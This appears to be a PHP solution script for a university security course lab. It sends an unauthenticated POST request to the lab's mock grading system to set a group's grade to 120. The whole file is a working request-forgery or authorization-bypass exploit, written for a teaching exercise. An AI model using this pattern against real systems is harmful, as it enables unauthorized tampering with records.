<?php
$url = 'https://cse484.cs.washington.edu/lab2/supersecuregradingsystem/?action=update-grade';
$data = array('groups' => 'tjsl', 'grade' => '120');

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);
?>